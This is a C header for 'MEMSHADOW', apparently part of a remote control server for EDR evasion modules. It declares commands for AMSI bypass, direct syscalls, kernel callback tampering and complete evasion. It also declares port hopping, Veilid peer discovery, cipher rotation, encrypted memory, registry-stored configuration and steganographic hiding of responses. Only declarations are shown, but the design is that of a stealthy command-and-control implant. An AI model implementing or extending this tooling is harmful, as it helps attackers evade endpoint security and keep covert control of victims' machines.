/*
 * MEMSHADOW Server Header
 * 
 * Complete MEMSHADOW remote control server for EDR evasion modules.
 */

#ifndef MEMSHADOW_SERVER_H
#define MEMSHADOW_SERVER_H

#include <windows.h>
#include <stdbool.h>

// Forward declarations
typedef struct MemshadowServer MemshadowServer;
typedef struct VeilidRegistration VeilidRegistration;
typedef struct PortHopMonitor PortHopMonitor;
typedef struct PortHopEvent PortHopEvent;
typedef struct CipherRotationState CipherRotationState;
typedef struct TrafficAnalysisState TrafficAnalysisState;
typedef struct CommandResult CommandResult;

// Cipher types
typedef enum {
    CIPHER_KASUMI = 0,
    CIPHER_MISTY1 = 1,
    CIPHER_SEED = 2
} CipherType;

// Steganography formats
typedef enum {
    STEGO_FORMAT_JSON = 0,
    STEGO_FORMAT_XML = 1,
    STEGO_FORMAT_HTML = 2
} StegoFormat;

// Command types
typedef enum {
    CMD_EXECUTE_AMSI_BYPASS = 1,
    CMD_EXECUTE_DIRECT_SYSCALLS = 2,
    CMD_EXECUTE_KERNEL_CALLBACKS = 3,
    CMD_EXECUTE_HARDWARE_EVASION = 4,
    CMD_EXECUTE_OPSEC_ENHANCEMENT = 5,
    CMD_EXECUTE_DEPENDENCY_EVASION = 6,
    CMD_EXECUTE_COMPLETE_EVASION = 7,
    CMD_GET_STATUS = 8,
    CMD_GET_REPORT = 9,
    CMD_CONFIGURE = 10,
    CMD_HEARTBEAT = 11,
    CMD_PORT_HOP = 12,
    CMD_CIPHER_ROTATE = 13
} CommandType;

// Server functions
bool memshadow_server_init(MemshadowServer *server, uint16_t initial_port,
                          void (*message_handler)(const uint8_t *, size_t, uint8_t **, size_t *));
bool memshadow_server_start(MemshadowServer *server);
void memshadow_server_stop(MemshadowServer *server);
bool memshadow_server_hop_port(MemshadowServer *server, uint16_t new_port);
uint16_t memshadow_server_get_port(MemshadowServer *server);

// Veilid discovery
bool veilid_register_app(VeilidRegistration *reg);
bool veilid_update_port(VeilidRegistration *reg, uint16_t new_port);
int veilid_discover_peers(const char *namespace_name, char peers[][256], int max_peers);
bool local_discovery_multicast(uint16_t port);

// Port hopping
bool port_hop_monitor_init(PortHopMonitor *monitor, void (*hop_callback)(PortHopEvent *));
bool port_hop_monitor_start(PortHopMonitor *monitor);
void port_hop_monitor_stop(PortHopMonitor *monitor);
uint16_t get_system_assigned_port(uint16_t port_min, uint16_t port_max);

// Command dispatcher
bool dispatch_command(uint16_t cmd_type, uint64_t command_id,
                     const uint8_t *args, size_t args_len,
                     CommandResult *result);

// Memory encryption
bool memory_encryption_init(void);
bool encrypt_memory(uint8_t *data, size_t data_len);
bool decrypt_memory(uint8_t *data, size_t data_len);
void secure_memory_wipe(void *ptr, size_t size);
void* allocate_encrypted_memory(size_t size);
void free_encrypted_memory(void *ptr, size_t size);
bool store_config_in_registry(const char *config_data, size_t config_len);
bool load_config_from_registry(char *config_data, size_t config_size, size_t *config_len);

// Steganography
bool stego_encode_response(const uint8_t *data, size_t data_len,
                           StegoFormat format,
                           char **output, size_t *output_len);

#endif // MEMSHADOW_SERVER_H
